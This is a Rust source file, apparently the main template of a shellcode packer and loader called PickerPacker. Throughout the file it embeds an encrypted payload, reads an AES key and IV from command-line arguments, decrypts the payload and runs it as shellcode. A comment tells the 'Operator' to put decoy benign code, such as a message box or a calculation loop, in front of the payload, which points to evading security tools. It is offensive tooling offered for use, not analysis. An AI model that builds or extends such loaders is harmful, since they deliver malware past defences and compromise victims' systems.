// TODO: Add all other nessesary imports from the snippets you're using here
// The existing ones can be removed obviously, as this is exemplary code ;-)

use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
use windows::core::{PSTR, s};
use std::ffi::c_void;

#[cfg(feature = "TinyAES")]
use std::env;

#[cfg(feature = "ShellcodeExecuteDefault")]
mod execution;

#[cfg(feature = "TinyAES")]
mod aes;

#[cfg(feature = "embedded")]
const ENCPAYLOAD: &[u8] = &[];  // replace with the encrypted payload data

#[cfg(feature = "TinyAES")]
fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
    if hex_str.len() % 2 != 0 {
        return Err("Hex string must have even length".to_string());
    }
    
    let mut bytes = Vec::new();
    for i in (0..hex_str.len()).step_by(2) {
        let byte_str = &hex_str[i..i+2];
        match u8::from_str_radix(byte_str, 16) {
            Ok(byte) => bytes.push(byte),
            Err(_) => return Err(format!("Invalid hex characters: {}", byte_str)),
        }
    }
    Ok(bytes)
}

fn main() {

    /*
    For the Operator, Write some benign code that is to be executed
     */

        #[cfg(feature = "messagebox")]
        unsafe {
            MessageBoxA(
                None,
                s!("Hello World"),
                s!("Hello"),
                MB_OK,
            );
        }

        #[cfg(feature = "calculation")]
        fn calculate()
        {
            let mut result = 0;
            for i in 0..10000 {
                result += i;
            }
            println!("Result: {}", result);
        }
        #[cfg(feature = "calculation")]
        calculate();

        // Execute shellcode using default execution method
        #[cfg(all(feature = "ShellcodeExecuteDefault", feature = "embedded", not(feature = "TinyAES")))]
        {
            let shellcode = ENCPAYLOAD.to_vec();
            if !execution::shellcode_execute_default(shellcode) {
                eprintln!("Failed to execute shellcode");
            }
        }

        // Execute shellcode with AES decryption + default execution
        #[cfg(all(feature = "ShellcodeExecuteDefault", feature = "embedded", feature = "TinyAES"))]
        {
            let args: Vec<String> = env::args().collect();
            let mut aes_key_str = String::new();
            let mut aes_iv_str = String::new();
            
            // Parse command-line arguments
            for i in 0..args.len() {
                match args[i].as_str() {
                    "--key" if i < args.len() - 1 => aes_key_str = args[i + 1].clone(),
                    "--iv" if i < args.len() - 1 => aes_iv_str = args[i + 1].clone(),
                    _ => {}
                }
            }
            
            // Check if key and IV are provided
            if aes_key_str.is_empty() || aes_iv_str.is_empty() {
                eprintln!("[-] Error: AES decryption requires both --key and --iv arguments");
                eprintln!("    Usage: PickerPacker.exe --key <64_hex_chars> --iv <32_hex_chars>");
                std::process::exit(1);
            }
            
            // Validate and convert key
            let aes_key = match hex_to_bytes(&aes_key_str) {
                Ok(bytes) if bytes.len() == 32 => bytes,
                Ok(_) => {
                    eprintln!("[-] Error: AES key must be exactly 64 hex characters (32 bytes)");
                    std::process::exit(1);
                }
                Err(e) => {
                    eprintln!("[-] Error parsing key: {}", e);
                    std::process::exit(1);
                }
            };
            
            // Validate and convert IV
            let aes_iv = match hex_to_bytes(&aes_iv_str) {
                Ok(bytes) if bytes.len() == 16 => bytes,
                Ok(_) => {
                    eprintln!("[-] Error: AES IV must be exactly 32 hex characters (16 bytes)");
                    std::process::exit(1);
                }
                Err(e) => {
                    eprintln!("[-] Error parsing IV: {}", e);
                    std::process::exit(1);
                }
            };
            
            let encrypted_shellcode = ENCPAYLOAD;
            match aes::aes_decrypt(encrypted_shellcode, &aes_key, &aes_iv) {
                Some(decrypted_shellcode) => {
                    if !execution::shellcode_execute_default(decrypted_shellcode) {
                        eprintln!("Failed to execute shellcode");
                    }
                }
                None => {
                    eprintln!("Failed to decrypt shellcode");
                }
            }
        }
}